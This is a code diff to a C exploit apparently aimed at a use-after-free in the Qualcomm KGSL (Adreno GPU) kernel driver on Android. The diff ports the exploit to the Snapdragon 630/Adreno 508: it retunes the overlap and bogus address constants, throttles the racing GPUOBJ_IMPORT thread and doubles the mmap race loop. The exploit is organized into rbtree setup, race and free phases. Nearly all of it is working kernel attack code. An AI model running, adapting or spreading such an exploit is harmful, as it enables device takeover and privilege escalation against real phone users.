@@ -73,8 +73,10 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define UAF_SIZE  0x10004000ULL
 #define OVERLAP_ADDR 0x7001fe000ULL
 #define OVERLAP_SIZE 0x7000ULL
-#define BOGUS_ADDR 0x700204000ULL
-#define BOGUS_SIZE 0xffffffffffefd000ULL
+
+#define BOGUS_ADDR 0x700100000ULL
+#define BOGUS_SIZE 0x100000000ULL
+
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
@@ -194,7 +196,10 @@ static void *race_thread(void *arg) {
         .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
         .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
     };
-    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
+    while (!race_done) {
+        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
+        usleep(1); /* give main thread a chance */
+    }
     return NULL;
 }
 
@@ -204,14 +209,21 @@ static bool phase2_race(void) {
     if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
 
     int hit = 0;
-    for (int i = 0; i < 5000000; i++) {
+    for (int i = 0; i < 10000000; i++) {
         void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
             PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
             kgsl_fd, (off_t)ov_id << 12);
         int e = errno;
-        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
-        if (e == ENODEV) { hit = 1; break; }
-        if (i % 500000 == 0) printf("  race %d/5000000 errno=%d\n", i, e);
+        if (r != MAP_FAILED) {
+            munmap(r, OVERLAP_SIZE);
+            hit = 1;
+            break;
+        }
+        if (e == ENODEV) {
+            hit = 1;
+            break;
+        }
+        if (i % 500000 == 0) printf("  race %d/10000000 errno=%d\n", i, e);
     }
 
     race_done = 1;
@@ -424,7 +436,7 @@ static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
 
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] KGSL UAF Analyzer\n");
+    printf("[*] KGSL UAF Analyzer (adapted for SD630/Adreno508)\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
@@ -433,7 +445,8 @@ int main(int argc, char **argv) {
     printf("[*] Phase 1: rbtree setup\n");
     phase1_rbtree();
 
-    printf("[*] Phase 2: race\n");
+    printf("[*] Phase 2: race (BOGUS_SIZE=0x%lx, BOGUS_ADDR=0x%lx)\n",
+           (unsigned long)BOGUS_SIZE, (unsigned long)BOGUS_ADDR);
     if (!phase2_race()) { close(kgsl_fd); return 1; }
 
     printf("[*] Phase 3: free UAF\n");
